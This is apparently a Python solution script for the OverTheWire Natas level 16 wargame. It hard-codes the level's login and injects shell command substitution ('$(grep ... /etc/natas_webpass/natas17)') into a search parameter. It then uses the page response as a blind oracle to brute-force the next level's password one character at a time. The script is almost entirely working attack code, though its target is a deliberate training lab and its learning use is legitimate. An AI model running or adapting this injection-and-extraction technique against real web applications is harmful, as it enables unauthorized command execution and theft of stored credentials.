import requests, string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
all_characters = ''.join([string.ascii_letters, string.digits])
exists_str = "This user exists."
password = ""
possible_chars = []

# Gather list of all chars
# for char in all_characters:
#   query = "wrong$(grep " + char + " /etc/natas_webpass/natas17)"
#   r = requests.get(url, auth=(auth_username, auth_password), params={"needle": query})

#   if "wrong" not in r.text:
#     possible_chars.append(char)
#     print(possible_chars)

possible_chars = ['b', 'd', 'h', 'k', 'm', 'n', 's', 'u', 'v', 'B', 'C', 'E', 'H', 'I', 'K', 'L', 'R', 'S', 'U', 'X', '0', '1', '7', '9']

for i in range(0, 32):
  for char in possible_chars:
    query = "wrong$(grep " + password + char + " /etc/natas_webpass/natas17)"
    print (query)
    r = requests.get(url, auth=(auth_username, auth_password), params={"needle": query})

    if "wrong" not in r.text:
      password += char
      print(password)
      break